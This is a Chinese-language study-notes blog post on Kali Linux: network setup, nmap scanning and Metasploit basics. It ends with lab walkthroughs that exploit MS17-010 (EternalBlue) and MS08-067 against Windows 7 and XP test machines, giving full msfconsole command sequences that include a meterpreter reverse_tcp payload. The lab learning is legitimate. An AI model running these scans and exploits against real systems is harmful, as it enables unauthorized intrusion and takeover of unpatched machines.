# kali的学习

## 网络配置

### 1.kali的网络设置

首先我们了解kali的网络设置

```undefined
DHCP：动态主机配置协议 是一个局域网的协议 使用UDP 协议工作
 
静态IP：用于大部分的中小型网络 通过网络管理员手动分配IP
```

#### 原理进程

```cobol
/etc  系统大部分服务启动过程都要访问该目录 
 
我们直接去看看
 
/ect/network/interfaces
```

```cobol
这里就可以配置两个
 
1.DHCP:
 
auto eth0
iface eth0 inet dhcp //配置eth0使用DHCP协议
 
 
2.静态ip
 
auto eth0
iface eth0 inet static //配置eth0使用默认的静态地址
address 192.168.0.90 //设置eth0的IP地址，根据需求配置
gateway 192.168.0.1 //配置当前主机的默认网关，根据需求配置
netmask 255.255.255.0 //配置eth0的子网掩码，根据需求配置
```

#### 然后就是设置 DNS

```cobol
resolv.conf中 可以配置3 个 nameserver 
 
一旦前面失效 就会尝试下一个 
```

```cobol
vi /etc/resolv.conf #进行DNS编辑
 
    nameserver 114.114.114.114 //国内移动、电信和联通通用的DNS
 
    nameserver 8.8.8.8 //是谷歌的IP地址
 
    nameserver 223.5.5.5 //是阿里云的IP地址
 
    nameserver 180.76.76.87 //是百度的IP地址
 
保存，退出
```

然后进行重启网络设置

```undefined
sudo service networking restart
```

### 2.kali的三种模式

```sql
NAT 网络地址转移模式
 
Bridged 桥接模式 
 
Host-Only 主机模式
```

#### NAT

```undefined
NAT 就是虚拟系统会通过 宿主机 来访问外网
 
相当于主机存在两个网卡
 
一个是虚拟网卡 一个宿主机的网卡
 
当虚拟网卡想要访问外网的时候 就必须通过宿主机的IP地址
 
从外面看 就是宿主机的IP 是完全看不到虚拟环境的内部网络
 
这个时候 
 
虚拟机和宿主机和虚拟交换机形成一个网段
 
宿主机和真实交换机形成一个网段
```

```undefined
优点
 
不需要自己手动分配ip
 
只要宿主能访问即可
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/59cfb3470417c060cad7b0c158d8ad06.png" alt="" style="max-height:490px; box-sizing:content-box;" />


#### Bridged

```cobol
桥接模式就是 虚拟网卡和物理网卡通过 VMnet0虚拟交换机进行桥接
 
 
这个时候 VMnet0就相当于现实的交换机
 
他可以访问这个网络内的所有主机
 
但是需要手动设置 ip 子网掩码
 
这个模式中 可以互相ping
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d3d65ce75feb4fdc07baed9409fe3a0d.png" alt="" style="max-height:659px; box-sizing:content-box;" />


#### Host-Only

```sql
在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。
 
其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。
```

 [kali的网络设置及三种网络模式_kali配置网络_木_木的博客-CSDN博客](https://blog.csdn.net/weixin_43910033/article/details/109191978) 

## NMAP

 [ctf工具Nmap使用教程图文教程（超详细）_ctf 端口扫描_程序员小麦的博客-CSDN博客](https://blog.csdn.net/maiya_yayaya/article/details/131359327) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/6389d80cd290c6dab0ae65ee2d0f5eb9.png" alt="" style="max-height:782px; box-sizing:content-box;" />


### 一.端口扫描

扫描主机开发的端口 与服务(默认是1000个端口)

```less
nmap [ip]
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6abecfa5cd7e741eb1e68f2f751b4ad8.png" alt="" style="max-height:291px; box-sizing:content-box;" />


这里将我本机的端口扫描出来了 并且显示了 每个端口的服务是什么

#### 1.指定端口

其中我们可以对主机进行指定端口扫描 通过 -p指令

```cobol
nmap 192.168.3.25 -p 80  单个
 
nmap 192.168.3.25 -p 1-80   范围
 
nmap 192.168.3.25 -p 80,3389,22,21  枚举
 
nmap 192.168.3.25 -p 1-65535   范围
 
nmap 192.168.3.25 -p-   相当于 1-65536
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c9ac936959847dada25d9a8deaeeb2a6.png" alt="" style="max-height:474px; box-sizing:content-box;" />


#### 2.指定扫描方式

```diff
-sT 使用三次完整的握手来判断存活 否则失败
```

```diff
-sS  通过两次握手来 如果对方传回确认帧 那么就存活
```

### 二.主机存活

```diff
可以扫描哪里主机存活
 
-sP 不扫描端口 只扫描主机
 
其实实质上就是 ping 只要ping通 就说明存活
```

```cobol
nmap 192.168.3.0/24 -sP
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b41f4a6efcdfdf0e8328440eda92e729.png" alt="" style="max-height:227px; box-sizing:content-box;" />


上面显示了 256个IP中存在3个活着的 主机

### 三.服务扫描

```undefined
在扫描端口的时候 会默认显示端口存在的服务
 
如果要查看服务的具体版本 就可以使用 -sV
```

```cobol
nmap 192.168.3.25 -p 80 -sV
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/004a0ad9fe1277f7b877392b24784493.png" alt="" style="max-height:264px; box-sizing:content-box;" />


发现是apache的服务器

### 四.系统识别

```cobol
-O 可以识别端口的主机的系统
 
nmap 192.168.3.25 -p 80 -O
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d96c59f62169dc98de59d7be48c66e9f.png" alt="" style="max-height:272px; box-sizing:content-box;" />


发现这里就显示 run在 win10上

### 五.探测防火墙

我们可以通过 nmap 来探测防火墙的存在

```cobol
nmap 192.168.3.25  -sF
```

### 组合命令

```cobol
T4可以指定时序 0-5 级别越高 速度越快 越容易被防火墙ban
 
 
nmap -F -T4 -P0
 
-F 100个端口  -P0 无ping扫描
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a954bf41407ca6e2a3d76bb7d0817bbf.png" alt="" style="max-height:301px; box-sizing:content-box;" />




```diff
nmap -sC -sV  -Pn  192.168.3.25
 
-sC 通过 nmap 脚本探测
 
-Pn 进制ping 后扫描 
 
-sV  版本探测
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e1aeea3e0c6ea1f792f410215b0ef14a.png" alt="" style="max-height:737px; box-sizing:content-box;" />




```cobol
nmap -A -v -T4 +IP
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/23f8c8741496786d3e2f8ab7c9160e6c.png" alt="" style="max-height:940px; box-sizing:content-box;" />


## MSF

```scss
MATESPLOIT(MSF)是个免费开源的 攻击框架
 
附带了很多已知 知名的漏洞 
 
在刚刚MSF出现的时候 只要会使用 MSF 就可以对未打补丁或刚刚打补丁的进行攻击
 
```

在kali中自带了 MSF

所以我们只需要启动即可

```undefined
msfconsole
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d8fc90a014d79e06d4ad2cdf34f24b7c.png" alt="" style="max-height:441px; box-sizing:content-box;" />


这里对MSF的几个模块进行解释

```cobol
1、Auxiliary（辅助模块）
 
收集信息 提供大量辅助的一个模块
 
2、Exploits（攻击模块）
 
通过调动漏洞 进行攻击
 
 
3、Payload（攻击载荷模块）
 
 
攻击成功后促使靶机运行的一段植入代码
 
4、Post （后渗透攻击模块）
 
 
收集更多信息或进一步访问被利用的目标系统
 
 
5、Encoders（编码模块）
 
 
就是通过 编码绕过
```

首先来了解一下基础的用法

 [【工具使用】——Metasploit(MSF)使用详解(超详细)_剑客 getshell的博客-CSDN博客](https://blog.csdn.net/weixin_45588247/article/details/119614618) 

```cobol
msfconsole
 
进入 msf框架
 
search  ms17_010
 
通过 search 命令查找漏洞
 
use exploit/windows/smb/ms17_010_eternalblue
 
通过 use 进入模块
 
info 
 
查看设置
 
set payload windows/x64/meterpreter/reverse_tcp  
 
设置 攻击模块为 这个漏洞
 
options
 
查看参数
 
set  RHOST  192.168.100.158   
 
设置攻击对象
 
run
 
进行攻击
 
```

大致就差不多是这样



## 我们复现一下 永恒之蓝 ms17-010

首先准备win7 的 IP  地址 我这里是 192.168.222.133

我们先通过 nmap 查看 一个网段存活的主机

```cobol
nmap -sS 192.168.222.0/24
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4971f10572a9f448c9f43c029026cfdf.png" alt="" style="max-height:143px; box-sizing:content-box;" />


发现存在 5 个 其中能发现我们要攻击的主机ip

133



<img src="https://i-blog.csdnimg.cn/blog_migrate/79ee03d097371bf18996507eab6dcf83.png" alt="" style="max-height:250px; box-sizing:content-box;" />


那么我们就看看 他是什么系统的

```cobol
nmap -O 192.168.222.133
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7602a2246123fa9087c39a5472af3a38.png" alt="" style="max-height:132px; box-sizing:content-box;" />


然后使用 nmap的脚本查看存在什么漏洞

```cobol
nmap --script=vuln 192.168.222.133
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ab16150a3e9564b79c9473532eb2149.png" alt="" style="max-height:237px; box-sizing:content-box;" />


发现主角了 ms17-010 那么我们就请出MSF

```cobol
msfconsole
search ms17-010
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ec1eb5de9cdefe7c196b66eaaca07dd9.png" alt="" style="max-height:314px; box-sizing:content-box;" />


这里exp的都是漏洞利用模块的 auxiliary是辅助探测模块 所以我们先通过 辅助探测 看看存不存在漏洞

这里直接 use 3



<img src="https://i-blog.csdnimg.cn/blog_migrate/3d45e74275c3886af491cfa03151501a.png" alt="" style="max-height:82px; box-sizing:content-box;" />


然后看看info



<img src="https://i-blog.csdnimg.cn/blog_migrate/6dba8c07f8697eb0386d1e3c24e1f751.png" alt="" style="max-height:203px; box-sizing:content-box;" />


发现了 这里rhosts没有设置 而且是必须设置的选项

那我们就设置 为 攻击目标的ip范围

```undefined
注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞
```

```cobol
set rhosts 192.168.222.100-192.168.222.190
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ca72f56604c11f946b828ee557c33aff.png" alt="" style="max-height:72px; box-sizing:content-box;" />




```undefined
exploit
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4c89dfa24ba60aa42e327a9fc03a7562.png" alt="" style="max-height:449px; box-sizing:content-box;" />


扫到了

那我们直接通过

```undefined
Exploit漏洞利用模块 对目标进行攻击
```

```cobol
set rhosts 192.168.222.133
```

然后run 即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/1f56fa56705609ba83fe2d0c9b495eda.png" alt="" style="max-height:410px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/362f521a774c78876d1b0c69008f49a6.png" alt="" style="max-height:94px; box-sizing:content-box;" />


这样就成功拿到shell了



<img src="https://i-blog.csdnimg.cn/blog_migrate/7eef094a8cd82d9164500efe1e90d5f1.png" alt="" style="max-height:104px; box-sizing:content-box;" />


接下来复现另一个漏洞

## MS08-067

 [ms08-067漏洞复现_ms08-067复现_老司机开代码的博客-CSDN博客](https://blog.csdn.net/weixin_43901998/article/details/108490618) 

```cobol
MicrosoftWindows是美国微软（Microsoft）公司发布的一系列操作系统。Windows的Server服务在处理特制RPC请求时存在缓冲区溢出漏洞。远程攻击者可以通过发送恶意的RPC请求触发这个溢出，导致完全入侵用户系统，以SYSTEM权限执行任意指令。对于Windows2000、XP和Server2003，无需认证便可以利用这个漏洞；对于WindowsVista和Server2008，可能需要进行认证。
```

首先需要一个 xp的系统 一样这里的ip为137

那我们直接开始

```cobol
nmap -sS 192.168.222.0/24
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3f0e4b939af758fa59e4369f0e358295.png" alt="" style="max-height:270px; box-sizing:content-box;" />


我们看看什么系统

```cobol
nmap -O 192.168.222.137
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c77415df16751f644aba60670d7eb4d0.png" alt="" style="max-height:394px; box-sizing:content-box;" />


发现也无法确定 那我们直接就 通过脚本扫

```cobol
nmap --script=vuln 192.168.222.137
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f335fa4c5cea4a9fb59982391c2c18a3.png" alt="" style="max-height:709px; box-sizing:content-box;" />


扫到了 并且也存在永恒之蓝

那我们直接启动  msf

```cobol
msfconsole
 
search MS08-067
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ec00ea255e45a2e049b2ba8210d4a0b7.png" alt="" style="max-height:193px; box-sizing:content-box;" />




```cobol
use 0
 
options
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce342a35fa93b86117fe796280ba4699.png" alt="" style="max-height:430px; box-sizing:content-box;" />




```sql
set RHOSTS 192.168.222.137
show targets
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/81f5439f50fc69e20c27b67af027be81.png" alt="" style="max-height:616px; box-sizing:content-box;" />




```cobol
set target 34
 
run
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a8db8655fb7009f88eea3585f0db3462.png" alt="" style="max-height:501px; box-sizing:content-box;" />


成功调用了cmd